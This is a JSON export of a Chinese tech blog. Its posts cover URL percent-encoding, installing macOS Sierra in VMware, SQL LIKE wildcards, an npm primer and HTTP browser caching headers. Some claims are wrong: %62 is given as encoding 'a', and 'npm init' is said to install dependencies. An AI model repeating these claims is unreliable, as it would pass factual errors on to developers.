因此，需要设立一种转义机制，用US-ASCII字符集的有限子集对任意字符值进行编码，从而实现在URL中可以包含全世界范围内各种各样的语言。 （2）使URL中存在的某些字符不存在歧义例如在URL中存在 query 字符串，query 字符串中存在key=value这样的参数对，键值对之间以“&amp;”符号分隔，例如a=a1&amp;b=b1&amp;c=c1&amp;d=d1。 但是如果某个参数对的value中包括了“=”或“&amp;”字符等具有特殊含义的字符，就会产生歧义（比如，query 字符串为：a=a&amp;1 &amp; b=b1 &amp; c=c1 &amp; d=d1，我们原本期望a=a&amp;1，而实际上去被理解成了a=a），这就会造成服务器在解析整个 query 字符串时出错。 因此，对于一些有特殊含义的字符，我们需要进行转义。 6.2 哪些字符需要编码那么问题来了，哪些字符需要编码？且如何编码？ RFC3986文档规定，URL中只允许包含英文字母（a-z or A-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符。 RFC3986文档对URL的编解码问题做出了详细的建议，指出了哪些字符需要被编码才不会引起URL语义的转变，以及对为什么这些字符需要编码做出了相应的解释。 为了避幵安全字符集表示法带来的限制，人们设计了一种编码机制，用来在URL中表示各种不安全的字符。这种编码机制就是通过一种“转义”表示法来表示非US-ASCII字符集中可表示的大小写字母和数字、不安全字符和保留字符，这种转义表示法包含一个百分号（％)，后面跟着两个表示字符ASCII码的十六进制数，所以通常 URL 编码又称为百分号编码。 接下来我们来明确，哪些字符需要编码： （1）保留字符如第3节 URL中组件含义中描述到，URL由若干组件组成，有一些字符是用于分隔不同URL组件（:/@;?#）。如:“//”用于分隔 scheme 和 host，“：”用于区分 host 和 port，等等。还有一些字符用于在特定组件中起到分隔作用，我们统称这些字符为保留字符。比如“；”**在 param 组件中分隔各个元素，“&amp;”在 query组件中分隔各个元素。 RFC3986中指定了以下字符为保留字符： ! * ‘ ( ) : ; @ &amp; = + $ , / ? # [ ] 当普通数据中包括上述特殊字符时，需要对其进行URL编码，否则就会歧义。例如上面的例子，我们本希望表达URL 的 query 组件为：a=a&amp;1&amp;b=b1&amp;c=c1&amp;d=d1，但是这是错误的！而正确的方式应该是将a&amp;1进行URL编码，为：a=a%261&amp;b=b1&amp;c=c1&amp;d=d1。 （2）不安全字符还有一些字符，当他们直接放在 URL中的时候，可能会引起解析程序的歧义。这些字符被视为不安全字符。 对于不安全字符，我们需要将其进行URL编码后才能放置在 URL 中。 空格 URL 在传输的过程，或者用户在排版的过程，或者文本处理程序在处理 URL 的过程，都有可能引入无关紧要的空格，或者将那些有意义的空格给去掉 引号以及&lt;&gt; 引号和尖括号通常用于在普通文本中起到分隔 URL 的作用 # 通常用于表示书签或者锚点 % 百分号本身用作对不安全字符进行编码时使用的特殊字符，因此本身需要编码 {}^[]`~ 某一些网关或者传输代理会篡改这些字符 需要记住： 合法字符出现在URL中时，对其编码和不编码都是一样的。比如“a”，无论是http://www.111.com/list?query=a，还是http://www.111.com/list?query=%62 都是一样的。 但是，如果保留字符或 不安全字符出现在 URL 的普通数据中，且未对其进行 URL 编码，则会产生歧义。 因此，一个经过 URL 编码的 URL，只有普通英文字符、数字和保留字符存在。 6.3 如何编码我们来讨论一下如何进行 URL编码： 对于ASCII字符集中的字符，用不用百分号表示均可。比如，http://www.111.com/list?query=a，和http://www.111.com/list?query=%62 均是正确的。 对于不存在于ASCII字符集中的字符，需要用ASCII字符集的超集（比如UTF-8）来表示，且再加上“%”。 例如“Url编码”，使用UTF-8编码得到的字节是0x55 0x72 0x6C 0xE7 0xBC 0x96 0xE7 0xA0 0x81，由于前三个字节存在于ASCII字符集中，因此这三个字节可以用“Url”直接表示。最终经过URL编码则为“Url%E7%BC%96%E7%A0%81” ./当然，如果你用”%55%72%6C%E7%BC%96%E7%A0%81”也是可以的。 需要强调的是，URL编码是一种通过“转义”表示法来表示非US-ASCII字符集中字符的编码机制，但URL编码本身其实未定义“如何用US-ASCII字符集来表示非US-ASCII字符集中字符”。 举个例子，我希望对大大傻进行URL编码，我既可以用UTF-8的方式，也可以用GB2312的方式（当然也还可以用别的）。 如果用UTF-8的编码方式，进行URL编码后是%e5%a4%a7%e5%a4%a7%e5%82%bb（“大”对应的UTF8编码是0xE5 0xA4 0xA7，“傻”对应的UTF8编码是0xE5 0x82 0xBB） 如果用GB2312的编码方式，进行URL编码后是%b4%f3%b4%f3%c9%b5（“大”对应的GB2312编码是0xB4 0xF3，“傻”对应的GB2312编码是0xC9 0xB5） 可以发现，URL编码本质只是一种使用%来转义非US-ASCII字符集中字符的机制，但是具体使用不同的编码方式进行URL编码，得到的结果是不同的。 但是，有时我们会默认URL编码中的编码方式是UTF-8，而不去显式的约定（因为，这也是URL编码的最佳实践编码方式）。 7.参考 《HTTP权威指南》 url 编码（percentcode 百分号编码） Wikipedia Uniform Resource Identifier","comments":true,"categories":[{"name":"HTTP","slug":"HTTP","permalink":"http://swsmile.info/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"http://swsmile.info/tags/HTTP/"}]},{"title":"【VMware】 VMware12中安装macOS Sierra 10.12.3","date":"2017-03-13T12:38:16.000Z","path":"2017/03/13/【VMware】VMware12中安装macOSSierra10-12-3/","text":"【Prerequisite】使用别人提供.vmdk 直接使用虚拟机使用别人提供的.vmdk，这是一种最简单的方法，在VMware中直接使用别人安装好的MacOS虚拟机。 参考：点我去 下载链接：Latest preview: 10.12 Final (16A323). September 20, 2016 Google Drive (One Full): https://goo.gl/OKgCeH Google Drive (5 of 5): https://goo.gl/DZTaKi Fix Download Limit: https://techsviewer.com/fix-download-limit 简单来说，就是下载一个别人已经做好的虚拟机，我们直接拿来用就行。但是，想起之前的XCodeGhost事件，还是决定在 MAC 平台 从 AppStore 上下载一个官方的系统镜像自己撸，所以这里有一个前提，首先你必须要有一个 MAC 平台 ，我们才能下载到官方的系统镜像（你可以找有 MacBook 的朋友让他帮你下一个）。 个人强烈不建议使用上面的这种直接使用网上提供的.vmdk的这种方法。因此，以下才是正题。 1 自己制作.iso镜像在 AppStore 中下载10.12.3官方镜像在 AppStore 中搜索mac就可以看到macOS Sierra镜像啦。点击“DOANLOAD”，系统很大，漫长的等待…. 制作成.iso下载完成后，操作系统会自动把这个.app mount，位于/Applications/Install\\ macOS\\ Sierra.app，如下图所示。 在Terminal中执行以下命令，最终就会在桌面上生成Sierra.isoiso镜像。 1234567891011121314151617181920212223hdiutil attach /Applications/Install\\ macOS\\ Sierra.app/Contents/SharedSupport/InstallESD.dmg -noverify -nobrowse -mountpoint /Volumes/install_apphdiutil create -o /tmp/Sierra.cdr -size 7316m -layout SPUD -fs HFS+Jhdiutil attach /tmp/Sierra.cdr.dmg -noverify -nobrowse -mountpoint /Volumes/install_buildasr restore -source /Volumes/install_app/BaseSystem.dmg -target /Volumes/install_build -noprompt -noverify -eraserm /Volumes/OS\\ X\\ Base\\ System/System/Installation/Packagescp -rp /Volumes/install_app/Packages /Volumes/OS\\ X\\ Base\\ System/System/Installation/cp -rp /Volumes/install_app/BaseSystem.chunklist /Volumes/OS\\ X\\ Base\\ System/BaseSystem.chunklistcp -rp /Volumes/install_app/BaseSystem.dmg /Volumes/OS\\ X\\ Base\\ System/BaseSystem.dmghdiutil detach /Volumes/install_apphdiutil detach /Volumes/OS\\ X\\ Base\\ System/hdiutil convert /tmp/Sierra.cdr.dmg -format UDTO -o /tmp/Sierra.isomv /tmp/Sierra.iso.cdr ~/Desktop/Sierra.iso Reference from HOW TO: Create a bootable Sierra ISO for VMware 2 VMware中安装.iso允许在VMware中安装MacOS如果没运行的unlocker208批处理(.bat)，会在VMware的新建虚拟机的操作系统列表中找不到 Apple Mac OS X的选项。 所以先运行 unlocker208，并运行unlocker208\\win-install.cmd (需要右键以管理员身份运行）。 unlocker下载地址：http://www.insanelymac.com/forum/files/file/339-unlocker/ 编辑.vmx文件安装完unlocker208，新建虚拟机，一步一步往下走，在新建虚拟机的操作系统列表中，就能看到Apple Mac OS X，继续疯狂下一步。 启动虚拟机，在首次运行时，还会报错（如下图）。 这时，需要虚拟机所在目录，找到xxx.vmx文件（我的是：macOS 10.12.vmx），右键用记事本方式打开，找到** smc.present = “TRUE”，在其下一行手动添加一句smc.version = 0**，添加完后如下图，再启动虚拟机，就可以愉快的安装啦。 如果你进到了下图所示这里，恭喜你！表明我们自己做的镜像没有问题。 系统分区选好语言后，我们要给我们的系统分区啦，使用“Disk Utility”这个官方工具，如下图。 依次点击“Erase”（步骤1），选择我们要操作的分区（步骤2），命名（步骤3），选择磁盘文件系统为Mac OS Extended(Journaled)（步骤4），模式为GUID（步骤5）。 对整个磁盘建立分区（左侧选择物理磁盘后，点击“Partition”）。具体分几个分区，分多大，你们自己决定吧。 这是我进行分区完之后的结果，之后就可以关闭“Disk Utility”工具，并且开始安装操作系统。 关闭工具后，开始安装操作系统。 安装ing这里选择你要将操作系统安装到哪个分区里，下一步后，就等待吧。。。。 出现这个后，就表示安装完啦，一些简单的设置，自己看着办吧。 进到系统后，就表明安装成功啦，10.12.3版本爽爽哒。 3 安装VMware Tools 一步一步走，再重启后，就完成啦。 4 与物理机共享文件夹在虚拟机设置中，增加一个共享文件夹，这样就可以在虚拟机和主机之间交换文件了 5 参考 Create a bootable Sierra ISO for VMware How to Install OS X 10.x (Snow Leopard to El Capitan) in VMware Workstation 10/11, Workstation Pro/Player 12, Player 6/7, ESXi 5/6 HOW TO: Create a bootable Sierra ISO for VMware VMware 安装 Mac OS X 10.11 El Capitan 全图文教程 如何在VMware上安装macOS Sierra 10.12 VMware 12 安装 macOS S 10.12 如何在VMware上安装macOS Sierra 10.12","comments":true,"categories":[{"name":"VMware","slug":"VMware","permalink":"http://swsmile.info/categories/VMware/"}],"tags":[{"name":"macOS","slug":"macOS","permalink":"http://swsmile.info/tags/macOS/"},{"name":"VMware","slug":"VMware","permalink":"http://swsmile.info/tags/VMware/"}]},{"title":"【SQL】 SQL 通配符使用","date":"2017-03-12T14:00:55.000Z","path":"2017/03/12/【SQL】SQL通配符使用/","text":"1 介绍通配符可用于替代字符串中的任何字符。在 SQL 中，通配符与 SQL LIKE 操作符一起使用。 通配符 描述 % 替代一个或多个字符 _ 仅替代一个字符 [charlist] 字符列的任何单一字符 [^charlist]或者[!charlist] 不在字符列中的任何单一字符 2 例子（1）xx%1SELECT * FROM Person WHERE name LIKE 'Ad%' 含义：匹配字段 name 以Ad开头的所有元素，比如 name = Ad or name = Adasd （2）xx_1SELECT * FROM Person WHERE name LIKE 'Ad_' 含义：匹配字段 name 以Ad开头，且之后包含一个字符的所有元素，比如 name = Ad1 or name = Adx （3）[charlist]1SELECT * FROM Person WHERE name LIKE &apos;Ad[fk]&apos; 含义：匹配字段 name 以Ad开头，且之后为 f 或者 k 字符的所有元素，比如 name = Adf or name = Adk （4）[^charlist]1SELECT * FROM Person WHERE name LIKE 'Ad[^fk]' 含义：匹配字段 name 以Ad开头，之后包含一个字符，且该字符不为 f 或者 k 字符的所有元素，比如 name = Ada or name = Adb （5）混合1SELECT * FROM Person WHERE LastName LIKE '%[fk]%' 含义：匹配字段 name 包含 f 或 k 的所有元素，比如 name = f or name = k or name = 111k or name = k222 or name = 222k333 3 转义字符（Escape Character）某些情况下，我们想匹配出 name = Ad_ 的所有元素，如下面的写法就不行了。这样的写法会匹配出Ad1,Ada等等元素，而不是我们期待的 Ad_，于是需要借助转义符。 1SELECT * FROM Person WHERE name LIKE 'Ad_' 注：不同的数据库对不同字符转义的表达可能不同，以下仅做一般意义的总结。 （1）用[]转义% or _下面例子，匹配出 name 包括 [的元素。 1select * from name_column where name LIKE '[[]' 下面例子，匹配出 name 包括 %的元素。 1select * from name_column where name LIKE '[%]' （2）自己定义转移符通过ESCAPE关键字，可以自己定义转移符。当转义符置于通配符之前时，该通配符就解释为普通字符。 下面例子，匹配出 name 包含 gyan_sagar的元素。 1select * from name_column where name like ‘gyan\\_sagar’ **ESCAPE** ‘\\’ 下面例子，匹配出 name 包含 5%的元素。 1select * from name_column WHERE ColumnA LIKE '%5/%%' ESCAPE '/' （3）小小总结 符号 含义 LIKE ‘5[%]’ 5% LIKE ‘5%’ 5 后跟 0 个或更多字符的字符串 LIKE ‘[_]n’ _n LIKE ‘_n’ an, in, on (and so on) LIKE ‘[a-cdf]’ a, b, c, d, or f LIKE ‘[-acdf]’ -, a, c, d, or f LIKE ‘[ [ ]’ [ LIKE ‘]’ ] （4）各种数据库的转义表达Oracle Special Characters in QueriesSQL Server Using SQL Escape Sequences 4参考 Escape single quotes and wild cards ‘%’ , ‘_’ in MS SQL","comments":true,"categories":[{"name":"SQL","slug":"SQL","permalink":"http://swsmile.info/categories/SQL/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://swsmile.info/tags/SQL/"}]},{"title":"【Node.js】 Node.js与NPM入门","date":"2017-03-11T14:06:17.000Z","path":"2017/03/11/【Node.js】 Node.js与NPM入门/","text":"引入近两年来，Node.js渐火。还有大厂用Node.js来做前后端分离，把更偏展示逻辑的C端（常见的Web框架中MVC架构）用Node.js重构，而让后端更专注于业务开发（详细可参考 Web 研发模式的演变）。 **增加Node层后的架构： 让我们逐一来介绍Node.js和NPM。 Node.jsNode.js是啥 Node.js 是一个基于 Chrome V8 引擎的跨平台的 JavaScript 运行环境。换句话而言，可以用JavaScript 来写传统的后端代码。 Node.js 使用了一个事件驱动、非阻塞式 I/O 的模型，使其轻量又高效。 npm（node package manager）是Node.js 的包管理器，是全球最大的开源库生态系统。 Node.js的运行引擎浏览器一般包括渲染器和JavaScript脚本引擎。以Chrome浏览器为例，从28版本以后，采用Blink （Blink 是基于 WebKit 的一个fork分支）布局渲染器（layout engine） 和 V8 脚本引擎。 因 V8 脚本引擎运行速度极快，Node.js 采纳了 V8 引擎作为其执行脚本的引擎，V8 引擎的本质其实是一个 JavaScript 运行引擎。 npmnpm 是 Node.js 的包管理器，完全采用 JavaScript 编写。 npm 是有超过 280000 个第三方包供开发者使用，任何的开发者也可以上传自己的包到 npm 上。 Node.js的安装你可以在 nodejs.org上，根据自己的平台下载到对应的 Node.js 版本进行安装。 当然，你也可以采用操作系统下的包管理器进行安装，如choco（Windows）、brewhome（Mac）。 12345// Winodws下$ choco install nodejs// Mac下$ brew install node 不管采用哪种方法安装，安装完成后，在 Conosle 下输入 node ，如果如下显示，则表明安装成功了。 Node.js简单使用直接运行代码输入 node，可以类似 Python 那样，采用实时交互的方式编程。 执行.js脚本当然，也可以直接执行 .js 脚本。 第三方库引用管理引入第三方库的两种模式在一个项目可以，可以通过 npm 引入第三方库（类似Java中在Project中引入Jar包），且有两种模式，称为local（本地）和global（全局）。 local模式在local模式下，它会将本项目需要的第三方库放置在 node_modules 文件夹（位于工作目录的父目录）中。这些第三方库仅限于给本项目使用。 我们可以用npm install &lt;Package name&gt;来安装一个local第三方库。 global模式Global模式，可以理解在本机的全局内都可以使用这个库。 我们可以用npm install &lt;Package name&gt; -g来安装一个全局第三方库。 global 的安装路径： 可以使用npm config get prefix查看这些 global 的安装路径。 对非Windows用户，会安装在root用户下{prefix}/lib/node_modules/（{prefix}通常是/usr/或者/usr/local）。这就意味需要使用sudo命令来安装global包，否则当解析第三方包依赖时，出于安全考虑可能会出现权限错误。 对Windows用户，默认安装在C:\\Users\\{UserName}}\\AppData\\Roaming\\npm\\node_modules中。 注意-f参数安装之前，npm install会先检查，node_modules目录之中是否已经存在指定模块。如果存在，就不再重新安装了，即使远程仓库已经有了一个新版本，也是如此。 如果你希望，一个模块不管是否安装过，npm 都要强制重新安装，可以使用-f或--force参数，即npm install &lt;packageName&gt; --force。 package.json在一个 Node 项目中， 我们通常使用 package.json 文件来帮助我们管理项目中对第三方库的依赖，同时这个文件中还记录一些项目相关的信息。 一个参考的package.json 文件格式：1234567891011121314151617181920212223&#123; \"name\": \"hexo-site\", \"version\": \"0.0.0\", \"private\": true, \"hexo\": &#123; \"version\": \"3.2.2\" &#125;, \"dependencies\": &#123; \"hexo\": \"^3.2.0\", \"hexo-deployer-git\": \"^0.2.0\", \"hexo-generator-archive\": \"^0.1.4\", \"hexo-generator-baidu-sitemap\": \"^0.1.2\", \"hexo-generator-category\": \"^0.1.3\", \"hexo-generator-index\": \"^0.2.0\", \"hexo-generator-json-content\": \"^3.0.1\", \"hexo-generator-sitemap\": \"^1.1.2\", \"hexo-generator-tag\": \"^0.2.0\", \"hexo-renderer-ejs\": \"^0.2.0\", \"hexo-renderer-marked\": \"^0.2.10\", \"hexo-renderer-stylus\": \"^0.3.1\", \"hexo-server\": \"^0.2.0\" &#125;&#125; 具体来说，在package.json中，包括dependencies 、devDependencies、optionalDependencies三个用于管理项目对第三方库依赖的项。 dependencies 项纪录了在生产环境下，本项目依赖的第三方库，devDependencies项纪录了在开发环境下，本项目依赖的第三方库。optionalDependencies项纪录了可选的依赖库。 下载依赖库在开发过程中，若需要增加一个库依赖，可以依靠npm install {package name}。而且，建议添加-save和save-dev参数，可以省掉你手动将这个依赖项增加到package.json文件的步骤。 1234567891011121314151617181920# 下载所有被列举在`package.json`的`dependencies`中的项$ npm install# 将package.json中devdependencies部分的所有项下载到node_modules文件夹下$ npm install --save-dev# 仅下载指定依赖项$ npm install &#123;package name&#125;# 下载当前指定依赖项，并自动把模块和版本号添加到 dependencies 部分$ npm install &#123;package name&#125; --save# 下载当前指定依赖项，并自动把模块和版本号添加到 devdependencies 部分$ npm install &#123;package name&#125; --save-dev# 下载当前指定依赖项，并自动把模块和版本号添加到 optionalDependencies 部分$ npm install &#123;package name&#125; --save-optional# 下载指定版本的依赖项$ npm install &lt;name&gt;@&lt;version&gt; Best Practise（使用 npm init）通常使用 Git 作为对本项目的版本管理工具时，需要将node_modules/项添加到.gitignore中（即告诉Git，你不需要跟跟踪 node_modules 文件夹中任何的变化）。 （我曾因为未添加node_modules/，而导致提交 commit 时，会把整个node_modules文件夹中的所有文件都 push 到服务器上，最终导致 commit一直失败！！） 如果 developer 去到了新的开发环境，或者有新的人员加入这个项目，只要使用npm init，npm 就会根据 package.json 中的括dependencies 和devDependencies记录，把本项目依赖的所有第三方库都下载下来（保存在node_modules文件夹中），这样就保证了项目中依赖资源的正确性和稳定性。 文件中声明使用的第三方库若某个文件依赖某个第三方库，除了执行npm install外，还需要在该文件的头部，声明对应的依赖库依赖（类似Java的import）。 1234// 引入了一个http库var http = require(\"http\");// 引入任意你想使用的库var sth = require(\"library name\"); 常用npm命令1234567891011121314151617181920212223242526272829303132# 列出已安装模块$ npm list # 更新已安装的某个模块或所有模块（不提供packageName ）。它会先到远程仓库查询最新版本，然后查询本地版本。如果本地版本不存在，或者远程版本较新，就会安装。npm update &lt;packageName&gt; # 显示版本，检查npm 是否正确安装。$ npm -v # 安装express模块$ npm install express # 全局安装express模块$ npm install -g express # 列出已安装模块$ npm list # 显示模块详情$ npm show express # 升级当前目录下的项目的所有模块$ npm update # 升级当前目录下的项目的指定模块$ npm update express # 升级全局安装的express模块$ npm update -g express # 删除指定的模块$ npm uninstall express npm scriptnpm 允许在package.json文件里面，使用scripts字段定义脚本命令。 123456&#123; ... \"scripts\": &#123; \"build\": \"node build.js\" &#125;&#125; 上面代码是package.json文件的一个片段，里面的scripts字段是一个对象。它的每一个属性，对应一段脚本。比如，build命令对应的脚本是node build.js。命令行下使用npm run命令，就可以执行这段脚本。 npm run build等同于执行node build.js。 这里，其实还可以简化npm run build -&gt; npm build，即，执行npm build和上面两条都是等同的。 这些定义在package.json里面的脚本，就称为 npm 脚本。它的优点很多。 Node.js 与 npm升级请参考https://swsmile.info/2017/04/09/Node.js%20%E4%B8%8E%20npm%E5%8D%87%E7%BA%A7/。 参考 Web 研发模式的演变 - http://blog.jobbole.com/65509/ Node.js Wikipedia - https://en.wikipedia.org/wiki/Node.js npm Wikipedia - https://en.wikipedia.org/wiki/Npm npm 模块安装机制简介 - http://www.ruanyifeng.com/blog/2016/01/npm-install.html npm-install - https://docs.npmjs.com/cli/install","comments":true,"categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://swsmile.info/categories/Nodejs/"}],"tags":[{"name":"Node.js","slug":"Node-js","permalink":"http://swsmile.info/tags/Node-js/"},{"name":"NPM","slug":"NPM","permalink":"http://swsmile.info/tags/NPM/"}]},{"title":"【Browser】 浏览器中的缓存机制","date":"2017-03-02T13:21:12.000Z","path":"2017/03/02/【Browser】浏览器中的缓存机制/","text":"浏览器中的缓存机制，其实就相当于HTTP协议定义的缓存机制，因为浏览器为我们实现了它。一般情况下我们会想到HTTP响应头中的 Pragma，Expires，Cache-Control，Last-Modified，If-Modified-Since，Etag ，因为这些域与缓存相关。 浏览器对这些域的处理： Pragma域Pragma行是为了兼容HTTP1.0，作用与 1Cache-Control: no-cache 是一样的。 浏览器缓存机制，其实主要就是HTTP协议定义的缓存机制（如： Expires； Cache-control等）。 但是也有非HTTP协议定义的缓存机制，如使用HTML Meta 标签，Web开发者可以在HTML页面的节点中加入标签，代码如下： 1&lt;META HTTP-EQUIV=&quot;Pragma&quot; CONTENT=&quot;no-cache&quot;&gt; 它告诉浏览器每次请求页面时都不要读缓存，都得往服务器发一次请求才行。 BUT!!! 事实上这种禁用缓存的形式用处很有限： 仅有IE才能识别这段meta标签含义，其它主流浏览器仅能识别“Cache-Control: no-store”的meta标签。 在IE中识别到该meta标签含义，并不一定会在请求字段加上Pragma，但的确会让当前页面每次都发新请求_（仅限页面，页面上的资源则不受影响）_。 做了测试后发现也的确如此，这种客户端定义Pragma的形式基本没起到多少作用。不过如果是在响应报文上加上该字段就不一样了： 如上图红框部分是再次刷新页面时生成的请求，这说明禁用缓存生效，预计浏览器在收到服务器的Pragma字段后会对资源进行标记，禁用其缓存行为，进而后续每次刷新页面均能重新发出请求而不走缓存。 Expires域有了Pragma来禁用缓存，自然也需要有个东西来启用缓存和定义缓存时间，对http1.0而言，Expires 就是做这件事的首部字段。 Expires 存储是一个用来控制缓存失效的日期。 当浏览器看到Response中有一个Expires头时，它会和相应的页面一起保存到其缓存中，只要页面没有过期，浏览器就会使用缓存中保存的页面版本而不会进行任何向服务器发送的HTTP请求，功能等同于max-age（下文会详细描述）；若该页面超过了Expires域中指定时间，Browser会重新访问Server获取页面数据。 设置的日期格式必须为GMT（格林尼治标准时间）。若此属性在一页上设置了多次，则使用最短的时间。 Expires 的一个缺点就是，返回的到期时间是服务器端的时间，这样存在一个问题，如果客户端的时间与服务器的时间相差很大（比如时钟不同步，或者跨时区），那么误差就很大，所以在HTTP 1.1版开始，使用Cache-Control: max-age=秒替代。，当Cache-Control的max-age和Expires同时存在时，Expires值会被Cache-Control的max-age覆盖。 在客户端我们同样可以使用meta标签来知会IE_（也仅有IE能识别）_页面_（同样也只对页面有效，对页面上的资源无效）_缓存时间： 1&lt;meta http-equiv=\"Expires\" content=\"Mon, 20 Jul 2009 23:00:00 GMT\" /&gt; 如果希望在IE下页面不走缓存，希望每次刷新页面都能发新请求，那么可以把“content”里的值写为“-1”或“0”。 如果是在服务端报头返回Expires字段，则在任何浏览器中都能正确设置资源缓存的时间：在上图里，缓存时间设置为一个已过期的时间点_（见红框）_，则刷新页面将重新发送请求_（见蓝框）_。 那么如果Pragma和Expires一起上阵的话，听谁的？我们试一试就知道了： 我们通过Pragma禁用缓存，又给Expires定义一个还未到期的时间_（红框）_，刷新页面时发现均发起了新请求_（蓝框）_，这意味着Pragma字段的优先级会更高。 Cache-Control域该域在HTTP1.1中添加。 服务器响应浏览器请求时响应头中的Cache-Control使得每个资源都可以通过 Cache-Control HTTP 头来定义自己的缓存策略，Cache-Control 指令用来告诉 Browser，该资源在什么条件下可以缓存，以及可以缓存多久。 Cache-Control头参数的含义(响应头中的Cache-Control) no-cache : 表示必须先与服务器确认返回的响应是否被更改，然后才能使用该响应来满足后续对同一个网址的请求。因此，如果存在合适的验证令牌 (ETag)，no-cache 会发起往返通信来验证缓存的响应，如果资源未被更改，可以避免下载。 no-store : 禁止缓存任何响应，也就是说每次用户请求资源时，都会向服务器发送一个请求，每次都会下载完整的响应。 public ： 所有内容都将被缓存(客户端和代理服务器都可缓存)。 private : 浏览器可以缓存private响应，但是通常只为单个用户缓存，因此，不允许任何代理服务器对其进行缓存 。比如，用户浏览器可以缓存包含用户私人信息的 HTML 网页，但是 CDN 不能缓存。 max-age : 用来设置资源被缓存的最长时间(单位是秒)；如果Cache-Control（且Cache-Control值为max-age）和Expires同时出现，则max-age有更高的优先级，浏览器会根据max-age的时间来确认缓存过期时间。在设置该值后，在设定的时间内都会使用这个版本的资源，即使服务器上的资源发生了变化，浏览器也不会得到通知。 若报文中同时出现了 Pragma、Expires 和 Cache-Control，会以 Cache-Control 为准。 Cache-Control也是一个通用首部字段，这意味着它能分别在请求报文和响应报文中使用。在RFC中规范了 Cache-Control 的格式为： 1&quot;Cache-Control&quot; &quot;:&quot; cache-directive 作为请求首部时，cache-directive 的可选值有：作为响应首部时，cache-directive 的可选值有： Last-Modified、If-Modified-Since在浏览器第一次请求某一个URL时，服务器端的返回状态会是200，内容是你请求的资源，同时有一个Last-Modified的属性标记此文件在服务期端最后被修改的时间，格式类似这样： 1Last-Modified: Fri, 12 May 2006 18:53:33 GMT 客户端第二次请求此URL时，根据 HTTP 协议的规定，浏览器会向服务器传送 If-Modified-Since 报头，询问该时间之后文件是否有被修改过： 1If-Modified-Since: Fri, 12 May 2006 18:53:33 GMT 如果服务器端的资源没有变化，则自动返回 HTTP 304 （Not Changed.）状态码，内容为空，这样就节省了传输数据量。当服务器端代码发生改变或者重启服务器时，则重新发出资源，返回和第一次请求时类似。从而保证不向客户端重复发出资源，也保证当服务器有变化时，客户端能够得到最新的资源。 Last-Modified/If-Modified-Sincec搭配使用 Last-Modified/If-Modified-Since也配合Cache-Control使用。 Last-Modified：标示这个响应资源的最后修改时间。web服务器在响应请求时，告诉浏览器资源的最后修改时间。 If-Modified-Since：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Last-Modified声明，则再次向web服务器请求时带上头 If-Modified-Since，表示请求时间。web服务器收到请求后发现有头If-Modified-Since 则与被请求资源的最后修改时间进行比对。若最后修改时间较新，说明资源又被改动过，则响应整片资源内容（写在响应消息包体内），HTTP 200；若最后修改时间较旧，说明资源无新修改，则响应HTTP 304 (无需包体，节省浏览)，告知浏览器继续使用所保存的cache。 Etag/If-None-Match Etag/If-None-Match也要配合Cache-Control使用。 Etag 是根据实体内容生成一段hash字符串，标识资源的状态，由服务端产生。浏览器会将这串字符串传回服务器，验证资源是否已经修改，如果没有修改，过程如下： 1 Etag配合If-None-Match使用Etag：web服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器决定）。Apache中，ETag的值，默认是对文件的索引节（INode），大小（Size）和最后修改时间（MTime）进行Hash后得到的。 If-None-Match：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Etage声明，则再次向web服务器请求时带上头If-None-Match （Etag的值）。web服务器收到请求后发现有头If-None-Match 则与被请求资源的相应校验串进行比对，决定返回200或304。 ETags和If-None-Match是一种常用的判断资源是否改变的方法。类似于Last-Modified和HTTP-IF-MODIFIED-SINCE。但是有所不同的是Last-Modified和HTTP-IF-MODIFIED-SINCE只判断资源的最后修改时间，而ETags和If-None-Match可以是资源任何的任何属性，不如资源的MD5等。 ETags和If-None-Match的工作原理是在HTTP Response中添加ETags信息。当客户端再次请求该资源时，将在HTTP Request中加入If-None-Match信息（ETags的值）。如果服务器验证资源的ETags没有改变（该资源没有改变），将返回一个304状态；否则，服务器将返回200状态，并返回该资源和新的ETags。 2 使用Etag相对于Last-modified的优点（使用ETag可以解决Last-modified存在的一些问题） 某些服务器不能精确得到资源的最后修改时间，这样就无法通过最后修改时间判断资源是否更新 如果资源修改非常频繁，在秒以下的时间内进行修改，而Last-modified只能精确到秒 一些资源的最后修改时间改变了，但是内容没改变，使用ETag就认为资源还是没有修改的。 3 既生Last-Modified何生Etag你可能会觉得使用Last-Modified已经足以让浏览器知道本地的缓存副本是否足够新，为什么还需要Etag（实体标识）呢？HTTP1.1中Etag的出现主要是为了解决几个Last-Modified比较难解决的问题： 123Last-Modified标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间如果某些文件会被定期生成，当有时内容并没有任何变化，但Last-Modified却改变了，导致文件没法使用缓存有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形 Etag是服务器自动生成或者由开发者生成的对应资源在服务器端的唯一标识符，能够更加准确的控制缓存。Last-Modified与ETag一起使用时，服务器会优先验证ETag。 如果 Last-Modified 和 ETag 同时被使用，则要求它们的验证都必须通过才会返回304，若其中某个验证没通过，则服务器会按常规返回资源实体及200状态码。 ETag生成规则 我们对ETag寄予厚望，希望它对于每一个url生成唯一的值，资源变化时ETag也发生变化。神秘的Etag是如何生成的呢？以Apache为例，ETag生成靠以下几种因子 文件的i-node编号，此i-node非彼iNode。是Linux/Unix用来识别文件的编号。是的，识别文件用的不是文件名。使用命令’ls –I’可以看到。 文件最后修改时间 文件大小: 生成Etag的时候，可以使用其中一种或几种因子，使用抗碰撞散列函数来生成。所以，理论上ETag也是会重复的，只是概率小到可以忽略。 组合使用方法1 最基本的设置：Cache-control: max-age=[secs] （类似于Expires域的功能） 这个是最最基础的一种策略，[secs]是cache在客户端存活的秒数，例如 Cache-control: max-age=1800 表明cache的时间是半小时,只使用这样一个声明就可以使浏览器能够将这个HTTP响应的内容写入临时目录做cache。 这里是简要过程: —首次访问时— 浏览器第一次请求资源http://test.qq.com/test.cgi 查询临时文件目录发现无Cache存储，遂发出请求到Web Server Web Server响应资源，并设定Cache-control:max-age=300 浏览器收到响应将资源呈献给用户的同时，在临时文件目录以 http://test.qq.com/test.cgi 为key缓存这个响应 —5分钟内— 浏览器再一次请求资源http://test.qq.com/test.cgi 查询临时文件目录发现存在cache存储，检查保鲜期max-age &lt; 